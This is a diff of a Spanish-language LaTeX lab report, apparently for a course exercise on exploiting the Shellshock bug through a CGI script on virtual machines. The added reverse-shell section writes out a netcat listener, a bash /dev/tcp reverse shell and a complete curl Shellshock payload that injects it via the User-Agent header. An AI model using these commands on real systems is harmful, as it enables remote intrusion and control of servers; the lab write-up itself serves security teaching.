@@ -54,10 +54,17 @@ Se debe insertar el script en \texttt{/usr/lib/cgi-bin} y cambiar sus permisos a
 
 Por último, se puede acceder al programa de manera remota de las siguientes maneras: 
 \begin{itemize}
-	\item Escribiendo en navegador la siguiente URL \texttt{http://_IP_MAQUINA/cgi-bin/progName.cgi}
-	\item Utilizando el comando curl: \texttt{curl http://_IP_MAQUINA/cgi-bin/progName.cgi}
+	\item Escribiendo en navegador la siguiente URL \texttt{http://\_{}IP\_{}MAQUINA/cgi-bin/progName.cgi}
+	\item Utilizando el comando curl: \texttt{curl http://\_{}IP\_{}MAQUINA/cgi-bin/progName.cgi}
 \end{itemize}
 
+A continuación se puede observar el resultado al acceder al programa cgi de la máquina virtual de forma remota.
+\begin{figure}[h!]
+	\centering
+	\includegraphics[scale=0.6]{images/Tarea_2.png}
+	\caption{Acceso a programa \emph{Hello world} de la máquina virtual }
+	\label{fig:tarea2_hello_world} 
+\end{figure}
 \section{Tarea 3: pasar datos a Bash a través de las variables de entorno}
 
 Para enviar un \emph{string} arbitrario al programa \emph{CGI} se ha utilizado el siguiente \emph{script}:\\
@@ -88,6 +95,7 @@ Se puede observar que la respuesta del servidor contiene la variable de entorno 
 \label{fig:tarea3_modificado} 
 \end{figure}
 
+\newpage
 \section{Tarea 4: Lanzamiento del Ataque Shellshock}
 
 Para ejecutar un ataque \emph{shellshock} contra el servidor hay que utilizar lo explicado en el apartado anterior. Se va a proceder a inyectar código extra en la definición de una función utilizando la variable de entorno \emph{HTTP\_{}USER\_{}AGENT}.\\
@@ -135,7 +143,36 @@ El resultado de este comando (Figura \ref{fig:tarea4_b}) indica que el usuario q
 
 \section{Tarea 5: Obtención de un Shell inverso a través de un ataque Shellshock}
 
-Hola
+El primer paso para la creación de un Shell inverso, es utilizar el comando \emph{netcat} (o nc) para escuchar una conexión en el puerto indicado. \\
+
+\texttt{nc -l 9090 -v <- Escucha en el puerto 9090}
+
+Este comando se bloquea esperando una conexión. Ahora, se debe conseguir ejecutar un bash en el equipo atacado para crear una conexión TCP con el puerto 9090 del equipo atacante y crear el shell inverso. El shell es el siguiente: 
+
+\texttt{/bin/bash -i > /dev/tcp/\_{}IP\_{}MAQUINA\_{}ATACANTE/9090 0<\&1 2>\&1}
+
+Explicación del comando anterior:\\
+
+\begin{itemize}
+	\item \texttt{/bin/bash -i ->} Con \emph{-i} se indica que el shell es interactivo
+	\item \texttt{> /dev/tcp/\_{}IP\_{}MAQUINA\_{}ATACANTE/9090 ->} Se redirige salida de la máquina atacada a la conexión TCP de la máquina atacante.
+	\item \texttt{0<\&1 ->} Se utiliza dispositivo de salida estándar como entrada estándar. Como la salida está redirigida a TCP, el shell obtendrá entrada de esta conexión.
+	\item \texttt{2>{}\&1 ->} La salida de error se redirige a salida, es decir, a la conexión TCP.
+\end{itemize} 
+
+Al ejecutar el comando en la máquina deseada, este se conecta con el proceso \emph{netcat} de la máquina atacante, permitiendo el shell interactivo de forma remota, tal y como se muestra en la siguiente imagen.
+\\
+
+\begin{figure}[h]
+	\centering
+	\includegraphics[scale=0.6]{images/Tarea_5.png}
+	\caption{\emph{Reverse shell} realizado sobre una máquina virtual}
+	\label{fig:tarea5_shell_inverso}
+\end{figure}
+
+El problema de este ataque recae en conseguir ejecutar el comando en la máquina remota cuando no se tiene acceso físico a la misma. Para ello se utiliza el ataque \emph{Shellshock}, mediante el cual se pueden ejecutar comandos de forma remota.
+Para poder realizar el ataque, se utilizará el siguiente comando desde la máquina atacante, mediante el cual se conseguirá establecer un \emph{reverse shell} en la máquina indicada.\\
+\texttt{curl -v -A "() { echo "HOLA"; }; echo Content-type: text/plain; echo; /bin/bash -i > /dev/tcp/\_{}IP\_{}MAQUINA\_{}ATACANTE/9090 0<\&1 2>\&1;" http://\_{}IP\_{}MAQUINA\_{}VICTIMA/cgi-bin/myprog.cgi}
 
 
 
